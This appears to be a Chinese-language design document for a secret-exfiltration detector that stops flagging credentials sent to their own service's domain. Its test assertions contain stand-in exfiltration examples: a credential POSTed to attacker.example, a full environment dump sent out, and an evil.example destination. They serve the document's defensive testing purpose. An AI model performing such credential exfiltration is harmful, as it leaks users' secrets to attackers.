<!-- SPDX-License-Identifier: MIT -->
# 025 — 凭据发往自家服务域名的链，和发给攻击者的链，字面一模一样

- **来源**:plan §3.1 第 4 步"目的地一致性";执行序 2(P-023 已决 3);issues/016 修复方向
- **依赖**:无(P-024 已合入 dev)
- **分支**:`p/025-exfil-destination-consistency`

<!-- 没有「状态」行:文件所在目录就是状态。 -->

## 问题

`EXFIL-001` 的误报里最大的一块,是把"凭据发往它自己的服务"当成外泄。真机与语料都显示,
剩下 147 个良性误报里 `EXFIL-001` 占 71 个(良性池第一大误报源),其形状是集成示例:

```
DEEPL_API_KEY  →  curl -H "Authorization: Bearer $DEEPL_API_KEY" https://api.deepl.com/v2/translate
$GEMINI_API_KEY →  https://generativelanguage.googleapis.com/...:predict?key=${GEMINI_API_KEY}
$TOKEN         →  curl -H "Authorization: Bearer $TOKEN" https://ghcr.io/...
```

链的两条腿(读凭据 + 出网)都在,`EXFIL-001` 判 high。但把 DeepL 的 key 发给 `api.deepl.com`
不是外泄,是这个 key 唯一的用途。回环降级(`netOffBox`)已经处理了"数据没离开本机"的那一类;
这一条处理"数据离开了本机,但去的是这个凭据本来就该去的地方"。

"发到自家服务"和"发给攻击者"在正则眼里字面相同——这正是 issues/016 记的误报地板,
也是从"看形状"到"看目的地"的第一步。

## 初步方向

在链上加一个和 `netOffBox` 平行的判断:凭据名里的**服务词**(`DEEPL_API_KEY` → `deepl`)
出现在该文件**所有**出网目的地的 host 里时,把 `EXFIL-001` 降为 low + advisory(与回环同档)。
同文件词法关联即可,不需要 AST(issues/016 已否决"按 URL 位置"两条路,方向是目的地一致性)。

**必须先量再落**(issues/016 的纪律,011 的 100→69 回归就是没先量的代价):
第一步是量清楚"服务词匹配"能翻回 71 个里的多少个,以及在 300 个恶意样本上会不会放走真外泄。
保守估计只覆盖"凭据按服务命名且域名带该词"的子集——泛化的 `$TOKEN`/`$API_KEY`(无服务词)、
以及名字与域名对不上的(`GEMINI`→`googleapis`)都不在内。真实数字由设计阶段 W1 给出。

**值得设计**:执行序 2(P-023 已决 3),plan §3.1 第 4 步。

## W1 先量的结果(2026-09-28,语料 4f964622,已做)

在 74 个被 `EXFIL-001` 判 high 的良性样本、26 个被判 high 的恶意样本上,量"凭据服务词 vs 目的地 host"的匹配:

| | 数 |
|---|---|
| 良性:每个真出网 host 都带某个凭据的服务词 → 降级 | **15** |
| 良性:其中 `EXFIL-001` 是唯一 high 发现 → 真的翻成 benign | **15**(全部) |
| 良性:有 host 不匹配(文档 URL、`example.com`、名字与域名对不上如 `GEMINI`→`googleapis`) | 39 |
| 良性:凭据腿是整表 dump / 无服务词 → **留 high**(该留) | 12 |
| **恶意:会被降级 → 假阴性** | **0** |

**结论,写进「不能说什么」**:目的地一致性是**安全的**(0 个真外泄被降级)但**幅度有限**:
良性 **147 → 132(4.6% → 4.1%)**,**到不了 plan 第 4 步写的"约 3%"**。那个估计偏乐观。
排除文档/占位域名的精修变体只多翻回 1 个(15→16),不值那份复杂度与风险,不做。
剩下的 ~120 个 `EXFIL-001` 良性误报是名字与域名对不上或用泛化 `$TOKEN` 的集成示例,不在本条内。

## 完成的判据

- [ ] `TestChain_DestinationConsistency`(`internal/detect/detect_test.go`):
      - `DEEPL_API_KEY` 读 + `curl -H "Bearer $DEEPL_API_KEY" https://api.deepl.com/...` → `EXFIL-001` **low + advisory**(与回环同档)
      - 多 host 且都匹配(`api.linear.app` + `linear.app`,凭据 `LINEAR_API_KEY`)→ 降级
      - **反向断言 1**:`JIRA_TOKEN` 读 + `POST https://attacker.example/collect` → `EXFIL-001` **high**(目的地不匹配)
      - **反向断言 2**:整表 dump(`JSON.stringify(process.env)`)+ `https://api.deepl.com` → **high**(无服务词可匹配,不能靠"碰巧发去某个已知域"降级)
      - **反向断言 3**:两个 host,一个匹配一个不匹配(`api.deepl.com` + `evil.example`)→ **high**(有一个真出网目的地对不上就不降)
- [ ] `make bench`:良性 **147 → 132**、恶意 **98 不变**(0 假阴性)、hard-negative 4/19、3539 全 scored
- [ ] 真机 `./bin/aguard scan --root ~/.claude`:头部贴进未决问题,确认没有把真外泄降级
- [ ] `make verify` 绿

## 不做什么

- **不排除文档/占位域名**(`docs.*`、`example.com`):量过只多 1 个,复杂度与漏报风险不值(见 W1)
- **不碰泛化 `$TOKEN`/`$API_KEY`**(无服务词):它们留 high,是另一类误报,不在本条
- **不加 host 白名单、不联网查域名**:只做同文件"凭据名 ↔ 目的地 host"的词法匹配(issues/016:host 归信誉那步)
- **不动 `netOffBox` 回环降级**、不改凭据腿/网络腿的定义、不碰 `EXFIL-002/003`
- **不改判官**、不引入新依赖
- **不改 `plan.zh-CN.md` 第 4 步的"约 3%"**:那是 P-023 的文档,本条在完成段用实测 4.1% 更正它的引用,plan 由 P-023 线维护

## 不能说什么

- **不写"目的地一致性把误报降到 3%"**:实测 4.1%,写"降级 15 个集成示例,4.6% → 4.1%,0 假阴性"
- **不写"识别了凭据的合法用途"这类拟人**:写"凭据名的服务词出现在所有出网目的地的 host 里时降级"
- 数字带分母:"74 个 `EXFIL-001` 良性里降 15","300 恶意里 0 个被降"

## 工作项

| W | 一句话 | 提交信息 |
|---|---|---|
| 1 | 量匹配率与安全性(**已在设计阶段做**,结果在上) | （无提交，写进设计） |
| 2 | `TestChain_DestinationConsistency`:降级三情形 + 三条反向断言;先红 | `detect: tests for a credential sent to its own service — red until the chain reads the destination (P-025)` |
| 3 | 链上加 `credService` 收集与 `destMatched`,`findings()` 在 `destMatched`（且有服务词、非整表 dump）时把 `EXFIL-001` 降 low+advisory,与 `netOffBox` 平行 | `detect: a chain whose every destination carries the credential's own service name is not exfiltration (P-025)` |
| 4 | `make bench` → `baselines/results/aguard/2026-09-28b/`（或当日覆盖），前后 verdict diff | `baselines: aguard after destination consistency — 132 benign, malicious unchanged (P-025)` |

## 未决问题

设计阶段一次问完,每条带建议答案。

1. **接受 4.1% 而不是 plan 的 3%?** 实测目的地一致性安全但只翻回 15 个。**已决(2026-09-28):接受,窄范围交付。** 建议:接受,在完成段用实测更正 plan 第 4 步的引用;
   剩下的 ~120 个(名字对不上、泛化 token)是不同机制,不在本条,谁想做另开。另一选项:本条扩到"文档/占位域名排除",但量过只多 1 个。
2. **匹配的严格度?** **建议并将按此实现:每个真出网 host 都要带某个已命名凭据的服务词才降**(反向断言 3)。
   有一个出网目的地对不上就不降——这是把假阴性摁在 0 的关键(实测 26 个恶意 0 降级)。 **已决(2026-09-28):按此。**
3. **降到哪一档?** **建议:low + advisory,与回环 `netOffBox` 同档**(数据离开了本机但去了它该去的地方,风险与"没离开本机"相当)。 **已决(2026-09-28):按此。**
4. **服务词怎么从凭据名取?** **建议:按 `_ - .` 切,去掉泛化词**(api/key/token/secret/com/io/www/v1/oauth… 一张停用词表),剩下长度 > 2 的词;
   host 按 `.` 切,交集非空即匹配。停用词表进代码常量,配测试。泛化 `$TOKEN` 切完为空 → 无服务词 → 不降(正确)。 **已决(2026-09-28):按此。**

**实现中攒下(2026-09-28)**

- **实测翻回 10,不是设计阶段脚本估的 15。** W1 的 Python 脚本读了样本目录所有文件、用较宽松的凭据名/URL 正则,
  高估了。真链更严:服务词只从 `credentialLine` 命中行、且过 `secretIdentRE` + `secretNameRE` 的名字取;目的地只从
  `networkHosts`(httpURL / dev-tcp / host-kv)在出网腿上取。真数字 **benign 147 → 137(4.6% → 4.25%)**,恶意 98 不变、0 假阴性。
  差的 5 个是脚本把文档 URL 或非出网腿上的名字也算了进去。honest number 以 `make bench` 为准。
- **真机 `scan --root ~/.claude`:降级 3 条,全部合法**——`OPENAI_API_KEY`→platform.openai.com、`NUTRIENT_API_KEY`→api.nutrient.io。
  没有真外泄被降级。
- 目的地 host 用 raw 读(homoglyph 安全),降级只作用于 `EXFIL-001`(非编码),`EXFIL-003` 保持 high。

## 完成

```
合入:PR(2026-09-28;sha 合入后用 git log --grep P-025 找)
发布:v0.13.0
证据:TestChain_DestinationConsistency(internal/detect/destination_test.go)——3 个降级 + 4 条反向断言(无关 host、整表 dump、匹配+不匹配、不可读目的地);
     W2 在 W3 前红(3 个降级 case 报 high),W3 后绿;
     make bench(corpus 4f964622):benign 147 → 137、malicious 98 不变(0 假阴性)、hard-negative 4/19、3539 全 scored、fixtures 与 2026-09-28 逐字节同 —— baselines/results/aguard/2026-09-28b/;
     真机 scan --root ~/.claude:降级 3 条全合法(OPENAI/NUTRIENT 各发往自家域),无真外泄被降;
     make verify: all gates passed
```
